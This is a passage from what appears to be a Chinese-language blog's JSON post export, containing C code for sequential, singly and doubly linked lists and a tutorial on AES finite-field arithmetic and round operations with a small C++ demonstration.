insertData=<span class=\"hljs-number\">10</span>;<br>    <span class=\"hljs-built_in\">int</span> my_new_position=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-built_in\">int</span> my_abandoned_data=<span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-built_in\">int</span> my_deleted_position=<span class=\"hljs-number\">2</span>;<br><br>    InitSqlist(&amp;my_list);<br>    CreateSqlist(&amp;my_list,my_data,my_length);<br>    InsertList(&amp;my_list,insertData,my_new_position);<br>    PrintList(&amp;my_list);<br>    DeleteDataByElement(&amp;my_list,my_abandoned_data);<br>    DeleteDataByPosition(&amp;my_list,my_deleted_position);<br>    <span class=\"hljs-comment\">// EmptyList(&amp;my_list);</span><br>    PrintList(&amp;my_list);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>统一使用头节点后的代码实现：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-function\">Linklist <span class=\"hljs-title\">Create_Linklist</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">int</span> n</span>)</span><br>&#123;<br>    LNode *L,*p,*q;<br>    <span class=\"hljs-built_in\">int</span> i;<br>    L=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));<br>    L-&gt;next=NULL;           <span class=\"hljs-comment\">//Head node;</span><br>    q=L;                    <span class=\"hljs-comment\">//q-&gt;L;</span><br>    <span class=\"hljs-keyword\">for</span>(i=<span class=\"hljs-number\">0</span>;i&lt;n;i++)<br>    &#123;<br>        p=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));<br>        printf(<span class=\"hljs-string\">&quot;Pelase enter data %d:&quot;</span>,i);<br>        scanf(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;p-&gt;data);\t\t\t <span class=\"hljs-comment\">//q=L,p赋值</span><br>        p-&gt;next=NULL;\t\t\t\t\t<span class=\"hljs-comment\">//q=L, p-&gt;NULL</span><br>        q-&gt;next=p;\t\t\t\t\t\t<span class=\"hljs-comment\">//q-&gt;p-&gt;NULL==L-&gt;p-&gt;null;</span><br>        q=p;\t\t\t\t\t\t\t<br>    &#125;\t\t\t\t\t\t\t\t\t<br>    <span class=\"hljs-keyword\">return</span> L;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">InsertData</span>(<span class=\"hljs-params\">Linklist L,ElemType data,<span class=\"hljs-built_in\">int</span> pos</span>)</span><br>&#123;<br>    LNode *p,*s;<br>    <span class=\"hljs-built_in\">int</span> index;<br>    p=L;<br>    index=<span class=\"hljs-number\">-1</span>;\t\t\t\t\t\t<span class=\"hljs-comment\">//index设置为-1，则从0开始计算链表长度</span><br>    <span class=\"hljs-keyword\">while</span>(p&amp;&amp;index&lt;pos<span class=\"hljs-number\">-1</span>)\t\t\t<span class=\"hljs-comment\">//循环找到目标元素的前一个元素</span><br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(!p||index&gt;pos<span class=\"hljs-number\">-1</span>)\t\t\t\t<span class=\"hljs-comment\">//p的下一个为空则不存在；index大于pos则出错；</span><br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    s=(LNode*)malloc(<span class=\"hljs-keyword\">sizeof</span>(LNode));\t<span class=\"hljs-comment\">//创建新空间</span><br>    s-&gt;data=data;\t\t\t\t\t<br>    s-&gt;next=p-&gt;next;\t\t\t<span class=\"hljs-comment\">//s=target</span><br>    p-&gt;next=s;\t\t\t\t\t<span class=\"hljs-comment\">//p-&gt;s,s-&gt;target</span><br>    printf(<span class=\"hljs-string\">&quot;Insert the data successfully.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">DeleteData</span>(<span class=\"hljs-params\">Linklist L,ElemType *e,<span class=\"hljs-built_in\">int</span> pos</span>)   <span class=\"hljs-comment\">//*e可以获得目标元素的地址</span></span><br>&#123;<br>    LNode *p,*q;<br>    p=L-&gt;next;\t\t\t\t\t\t\t<br>    <span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">-1</span>;<br>    <span class=\"hljs-keyword\">while</span>(p-&gt;next&amp;&amp;index&lt;pos<span class=\"hljs-number\">-1</span>)<br>    &#123;<br>        p=p-&gt;next;<br>        index++;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(!(p-&gt;next)||index&gt;pos<span class=\"hljs-number\">-1</span>)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    q=p-&gt;next;<br>    *e=q-&gt;data;\t\t\t\t\t<span class=\"hljs-comment\">//将data传入e</span><br>    p-&gt;next=q-&gt;next;<br>    free(q);<br>    printf(<span class=\"hljs-string\">&quot;Get the data: %d\\n&quot;</span>,*e);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br><br>&#125;<br><br><span class=\"hljs-comment\">//合并两个有序链表，且合成的链表也是顺序的</span><br><span class=\"hljs-function\">Linklist <span class=\"hljs-title\">MergeLinklist</span>(<span class=\"hljs-params\">Linklist A,Linklist B</span>)</span><br>&#123;<br>    LNode *pa,*pb,*pc,*C;<br>    pa=A-&gt;next;<br>    pb=B-&gt;next;<br>    C=pc=A;\t\t\t\t\t\t<span class=\"hljs-comment\">//C=A</span><br>    <span class=\"hljs-keyword\">while</span>(pa&amp;&amp;pb)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(pa-&gt;data&lt;=pb-&gt;data)<br>        &#123;<br>            pc-&gt;next=pa;\t\t<span class=\"hljs-comment\">//c-&gt;a1;</span><br>            pc=pa;\t\t\t\t<span class=\"hljs-comment\">//c=a1;</span><br>            pa=pa-&gt;next;\t\t<span class=\"hljs-comment\">//a1=a2</span><br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            pc-&gt;next=pb;<br>            pc=pb;<br>            pb=pb-&gt;next;<br>        &#125;<br>    &#125;<br>    pc-&gt;next=pa?pa:pb;<br>    free(B);<br>    <span class=\"hljs-keyword\">return</span> C;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintLinklist</span>(<span class=\"hljs-params\">Linklist L</span>)</span><br>&#123;<br>    LNode *p;<br>    p=L-&gt;next;<br>    printf(<span class=\"hljs-string\">&quot;DATA OUTPUT:&quot;</span>);<br>    <span class=\"hljs-keyword\">while</span>(p)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,p-&gt;data);<br>        p=p-&gt;next;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> e;<br><br>    Linklist MyLinklist;<br>    MyLinklist=Create_Linklist(<span class=\"hljs-number\">5</span>);<br>    PrintLinklist(MyLinklist);<br>    InsertData(MyLinklist,<span class=\"hljs-number\">101</span>,<span class=\"hljs-number\">3</span>);<br>    PrintLinklist(MyLinklist);<br>    DeleteData(MyLinklist,&amp;e,<span class=\"hljs-number\">3</span>);    <span class=\"hljs-comment\">//Use &amp; to get data;</span><br>    PrintLinklist(MyLinklist);<br><br><br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>二、双向链表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> Elemtype;<br><br><span class=\"hljs-comment\">//节点结构</span><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span>&#123;</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span> * <span class=\"hljs-title\">prior</span>;</span><br>    <span class=\"hljs-type\">int</span> data;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">DulNode</span> * <span class=\"hljs-title\">next</span>;</span><br>&#125;DulNode,*DulLinkList;<br><br>DulNode* <span class=\"hljs-title function_\">initDulNode</span><span class=\"hljs-params\">(DulNode * L,<span class=\"hljs-type\">int</span> length)</span>&#123;<br>    <span class=\"hljs-comment\">//创建一个首元节点，链表的头指针为L</span><br>    L=(DulNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(DulNode));<br>    <span class=\"hljs-comment\">//对节点进行初始化</span><br>    L-&gt;prior=<span class=\"hljs-literal\">NULL</span>;<br>    L-&gt;next=<span class=\"hljs-literal\">NULL</span>;<br>    L-&gt;data=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-comment\">//声明一个指向首元节点的指针，方便后期向链表中添加新创建的节点</span><br>    DulNode *r=L;<br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> count=<span class=\"hljs-number\">0</span>; count&lt;length; count++) &#123;<br>        <span class=\"hljs-comment\">//创建新的节点并初始化</span><br>        DulNode *p=(DulNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(DulNode));<br>        p-&gt;prior=<span class=\"hljs-literal\">NULL</span>;<br>        p-&gt;next=<span class=\"hljs-literal\">NULL</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter data %d:&quot;</span>,count);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;p-&gt;data);<br>        <span class=\"hljs-comment\">//新节点与链表最后一个节点建立关系</span><br>        r-&gt;next=p;<br>        p-&gt;prior=r;<br>        <span class=\"hljs-comment\">//r永远指向链表中最后一个节点，重点！！！！</span><br>        r=r-&gt;next;<br>    &#125;<br>    <span class=\"hljs-comment\">//返回新创建的链表</span><br>    <span class=\"hljs-keyword\">return</span> L;<br>&#125;<br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">display</span><span class=\"hljs-params\">(DulNode * L)</span>&#123;<br>    DulNode *temp=L-&gt;next;<br>    <span class=\"hljs-keyword\">while</span> (temp) &#123;<br>        <span class=\"hljs-comment\">//如果该节点无后继节点，说明此节点是链表的最后一个节点</span><br>        <span class=\"hljs-keyword\">if</span> (temp-&gt;next==<span class=\"hljs-literal\">NULL</span>) &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d\\n&quot;</span>,temp-&gt;data);<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &lt;-&gt; &quot;</span>,temp-&gt;data);<br>        &#125;<br>        temp=temp-&gt;next;<br>    &#125;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;<br>    <span class=\"hljs-comment\">//创建一个头指针</span><br>    DulNode * L=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-comment\">//调用链表创建函数</span><br>    L=initDulNode(L,<span class=\"hljs-number\">5</span>);<br>    <span class=\"hljs-comment\">//输出创建好的链表</span><br>    display(L);<br>    <span class=\"hljs-comment\">//显示双链表的优点</span><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n"},{"title":"AES算法","date":"2020-11-04T13:03:45.000Z","mp3":null,"cover":"img/mimaxue.jpg","_content":"\n# `AES数学基础`\n\n## 1.有限域GF(2^8)\n\nAES以字节为单位进行计算，一个字节8bit。\n\n多项式表示法：01010111———>x^6+x^4+x^2+x^1+x^0\n\n## 2.算法的基本运算\n\n### （1）加法、减法\n\n​\t**异或运算：01010111+10000011=11010100**\n\n### （2）乘法\n\n​\t要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。\n\n​\t对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)\n\n​\t在AES乘法中，需要将两数积mod m(x)。\n\n​\t**例：01010111*10000011=11000001**\n\n### （3）X乘运算\n\n \txtime()算法可用于面向字节的乘法运算。\n\n​\t根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算\n\n​\t例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0\n​\txtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)\n​\t=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)\n\n分类讨论：\n\n（1）当b7=0：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210055963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n（2）当b7=1：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210107640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n\n\n# \tAES算法描述\n\n## \t1.概述\n\n​\t分组长度：128bit\t\t密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）\n\n​\t基于Rijndael算法。\n\n## \t2.算法原理\n\n​\t**例：**\n\n​    已知：一轮输入状态矩阵：\n\n​\t**EA 04 65 85**\n\n​\t **83 45 5D 96**  \n\n \t**5C 33 98 B0**\n\n​\t **F0 2D AD C5**\n\n### （1）字节代换：关于字节的非线性变换（利用S盒）。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210124399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n代换结果：\n\n**87 F2 4D 97\nEC 6E 4C 90\n4A C3  46  E7\n8C D8 95  A6**\n\n### （2）行位移：将状态矩阵各行进行循环位移\n\n​\t第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit\n\n位移结果：\n\n**87    f2    4d    97\n6e    4c    90    ec   \t（左1）\n46    e7    4a    c3\t\t（左2）\na6    8c    d8    95**\t\t（左3）\n\n### （3）列混淆：将状态矩阵**右乘**列混淆矩阵，这个过程称为列混淆\n\n混淆矩阵：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210138340.png#pic_center)\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210149908.png#pic_center)\n\n\n混淆结果：\n\n**47    40    a3    4c\n37    d4    70    9f\n94    e4    3a    42\ned    a5    a6    bc**\n\n### （4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。\n\n\n\n### 3.代码实现（C语言）\n\n```\n#include<iostream>\n#include<cstdio>\n#include<cstring>\n#include<algorithm>\n#include<bitset>\nusing namespace std;\n \nint a[4][4] = {\n    {0x87, 0xF2, 0x4D, 0x97},\n    {0xEC, 0x6E, 0x4C, 0x90},\n    {0x4A, 0xC3, 0x46, 0xE7},\n    {0x8C, 0xD8, 0x95, 0xA6}\n};//字节代换后的矩阵\nint mixCol[4][4] = {\n    {0x02, 0x03, 0x01, 0x01},\n    {0x01, 0x02, 0x03, 0x01},\n    {0x01, 0x01, 0x02, 0x03},\n    {0x03, 0x01, 0x01, 0x02}\n};//列混淆矩阵\nint round_key[4][4] = {\n    {0xAC, 0x19, 0x28, 0x57},\n    {0x77, 0xFA, 0xD1, 0x5C},\n    {0x66, 0xDC, 0x29, 0x00},\n    {0xF3, 0x21, 0x41, 0x6A},\n};//轮密钥矩阵\n \nint b[4][4];//行移位后的矩阵\nint resMix[4][4];//列混淆后的矩阵\nint res[4][4];//轮密钥加后的矩阵\n \nint mul_mat(int x,int y) {\n    if(x == 0x01) {\n        return y;\n    }\n    else if(x == 0x02) {\n        if((y&128) != 128) { //二进制首位为0\n            return y<<1;\n        }\n        else {\n            int temp = ((y<<1)&((1<<8)-1)); //向左移一位，删掉最高位(保留8位)\n            return temp^(0x1b);\n        }\n    }\n    else if(x == 0x03) {\n        return mul_mat(0x02,y)^y;\n    }\n}\n \n \nint main() {\n \n    cout<<\"字节代换后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<a[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n \n    //行移位\n    for(int i=0;i<=3;i++)\n        for(int j=0;j<=3;j++)\n            b[i][j] = a[i][(i+j)%4];\n \n    cout<<\"行移位后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<b[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n \n    //列混淆\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            for(int k=0;k<=3;k++) {\n                resMix[i][j] ^= mul_mat(mixCol[i][k],b[k][j]);\n            }\n        }\n    }\n    cout<<\"列混淆后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<resMix[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n \n    //轮密钥加\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            res[j][i] = resMix[j][i] ^ round_key[j][i];\n        }\n    }\n    cout<<\"轮密钥加后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<res[i][j]<<'\\t';\n        }\n        cout<<endl;\n    }\n}\n```\n\n\n","source":"_posts/AES.md","raw":"---\ntitle: AES算法\ndate: 2020-11-4 21:03:45\ncategories: \n    - 密码学\ntags: \n    - 密码学\n    - AES\nmp3: \ncover: img/mimaxue.jpg\n---\n\n# `AES数学基础`\n\n## 1.有限域GF(2^8)\n\nAES以字节为单位进行计算，一个字节8bit。\n\n多项式表示法：01010111———>x^6+x^4+x^2+x^1+x^0\n\n## 2.算法的基本运算\n\n### （1）加法、减法\n\n​\t**异或运算：01010111+10000011=11010100**\n\n### （2）乘法\n\n​\t要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。\n\n​\t对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)\n\n​\t在AES乘法中，需要将两数积mod m(x)。\n\n​\t**例：01010111*10000011=11000001**\n\n### （3）X乘运算\n\n \txtime()算法可用于面向字节的乘法运算。\n\n​\t根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算\n\n​\t例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0\n​\txtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)\n​\t=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)\n\n分类讨论：\n\n（1）当b7=0：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210055963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n（2）当b7=1：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210107640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n\n\n# \tAES算法描述\n\n## \t1.概述\n\n​\t分组长度：128bit\t\t密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）\n\n​\t基于Rijndael算法。\n\n## \t2.算法原理\n\n​\t**例：**\n\n​    已知：一轮输入状态矩阵：\n\n​\t**EA 04 65 85**\n\n​\t **83 45 5D 96**  \n\n \t**5C 33 98 B0**\n\n​\t **F0 2D AD C5**\n\n### （1）字节代换：关于字节的非线性变换（利用S盒）。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210124399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n代换结果：\n\n**87 F2 4D 97\nEC 6E 4C 90\n4A C3  46  E7\n8C D8 95  A6**\n\n### （2）行位移：将状态矩阵各行进行循环位移\n\n​\t第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit\n\n位移结果：\n\n**87    f2    4d    97\n6e    4c    90    ec   \t（左1）\n46    e7    4a    c3\t\t（左2）\na6    8c    d8    95**\t\t（左3）\n\n### （3）列混淆：将状态矩阵**右乘**列混淆矩阵，这个过程称为列混淆\n\n混淆矩阵：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210138340.png#pic_center)\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201104210149908.png#pic_center)\n\n\n混淆结果：\n\n**47    40    a3    4c\n37    d4    70    9f\n94    e4    3a    42\ned    a5    a6    bc**\n\n### （4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。\n\n\n\n### 3.代码实现（C语言）\n\n```\n#include<iostream>\n#include<cstdio>\n#include<cstring>\n#include<algorithm>\n#include<bitset>\nusing namespace std;\n \nint a[4][4] = {\n    {0x87, 0xF2, 0x4D, 0x97},\n    {0xEC, 0x6E, 0x4C, 0x90},\n    {0x4A, 0xC3, 0x46, 0xE7},\n    {0x8C, 0xD8, 0x95, 0xA6}\n};//字节代换后的矩阵\nint mixCol[4][4] = {\n    {0x02, 0x03, 0x01, 0x01},\n    {0x01, 0x02, 0x03, 0x01},\n    {0x01, 0x01, 0x02, 0x03},\n    {0x03, 0x01, 0x01, 0x02}\n};//列混淆矩阵\nint round_key[4][4] = {\n    {0xAC, 0x19, 0x28, 0x57},\n    {0x77, 0xFA, 0xD1, 0x5C},\n    {0x66, 0xDC, 0x29, 0x00},\n    {0xF3, 0x21, 0x41, 0x6A},\n};//轮密钥矩阵\n \nint b[4][4];//行移位后的矩阵\nint resMix[4][4];//列混淆后的矩阵\nint res[4][4];//轮密钥加后的矩阵\n \nint mul_mat(int x,int y) {\n    if(x == 0x01) {\n        return y;\n    }\n    else if(x == 0x02) {\n        if((y&128) != 128) { //二进制首位为0\n            return y<<1;\n        }\n        else {\n            int temp = ((y<<1)&((1<<8)-1)); //向左移一位，删掉最高位(保留8位)\n            return temp^(0x1b);\n        }\n    }\n    else if(x == 0x03) {\n        return mul_mat(0x02,y)^y;\n    }\n}\n \n \nint main() {\n \n    cout<<\"字节代换后的矩阵为：\"<<endl;\n    for(int i=0;i<=3;i++) {\n        for(int j=0;j<=3;j++) {\n            cout<<hex<<a[i][j]<<'\\t';\n        }\n        cout<<endl;\n   